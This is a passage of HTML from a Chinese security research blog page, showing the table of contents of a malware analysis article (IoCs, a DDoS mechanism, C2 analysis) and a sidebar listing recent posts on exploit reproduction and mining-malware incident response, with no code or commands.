class="toc-text">5. 感染指标 (IoC)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">文件系统:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C"><span class="toc-number">2.2.5.2.</span> <span class="toc-text">网络:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.2.5.3.</span> <span class="toc-text">进程:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">进一步分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90"><span class="toc-number">2.3.1.</span> <span class="toc-text">攻击模式深度分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DDoS%E6%94%BB%E5%87%BB%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.3.2.</span> <span class="toc-text">DDoS攻击机制详解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C2%E9%80%9A%E4%BF%A1%E5%88%86%E6%9E%90"><span class="toc-number">2.4.</span> <span class="toc-text">C2通信分析</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/10/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/linux%E7%89%88%E5%BE%AE%E4%BF%A11click%20rce/" title="linux版微信1click rce复现，国产系统通杀"><img src="/img/cover/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux版微信1click rce复现，国产系统通杀"/></a><div class="content"><a class="title" href="/2026/02/10/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/linux%E7%89%88%E5%BE%AE%E4%BF%A11click%20rce/" title="linux版微信1click rce复现，国产系统通杀">linux版微信1click rce复现，国产系统通杀</a><time datetime="2026-02-09T16:00:00.000Z" title="发表于 2026-02-10 00:00:00">2026-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/13/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/shiro%E6%9C%89key%E6%97%A0%E9%93%BE%EF%BC%88%E4%B8%8A%EF%BC%89/" title="[记录]尝试shiro有key无链利用，但失败"><img src="/img/cover/1.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[记录]尝试shiro有key无链利用，但失败"/></a><div class="content"><a class="title" href="/2026/01/13/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/shiro%E6%9C%89key%E6%97%A0%E9%93%BE%EF%BC%88%E4%B8%8A%EF%BC%89/" title="[记录]尝试shiro有key无链利用，但失败">[记录]尝试shiro有key无链利用，但失败</a><time datetime="2026-01-12T16:00:00.000Z" title="发表于 2026-01-13 00:00:00">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/" title="挖矿病毒事件的后门分析"><img src="/img/c1/3.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="挖矿病毒事件的后门分析"/></a><div class="content"><a class="title" href="/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/" title="挖矿病毒事件的后门分析">挖矿病毒事件的后门分析</a><time datetime="2025-12-29T16:00:00.000Z" title="发表于 2025-12-30 00:00:00">2025-12-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B010%E2%80%94%E2%80%94ida_pro%20mcp%E7%9A%84%E5%AE%89%E8%A3%85/" title="笔记10——ida_pro mcp的安装"><img src="/img/c1/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="笔记10——ida_pro mcp的安装"/></a><div class="content"><a class="title" href="/2025/12/29/%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B010%E2%80%94%E2%80%94ida_pro%20mcp%E7%9A%84%E5%AE%89%E8%A3%85/" title="笔记10——ida_pro mcp的安装">笔记10——ida_pro mcp的安装</a><time datetime="2025-12-28T16:00:00.000Z" title="发表于 2025-12-29 00:00:00">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/20/%E5%B7%A5%E4%BD%9C/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/" title="实战——挖矿病毒应急排查(docker镜像取证与分析)"><img src="/img/cover/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实战——挖矿病毒应急排查(docker镜像取证与分析)"/></a><div class="content"><a class="title" href="/2025/12/20/%E5%B7%A5%E4%BD%9C/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/" title="实战——挖矿病毒应急排查(docker镜像取证与分析)">实战——挖矿病毒应急排查(docker镜像取证与分析)</a><time datetime="2025-12-19T16:00:00.000Z" title="发表于 2025-12-20 00:00:00">2025-12-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/5.webp);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By lan1oc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>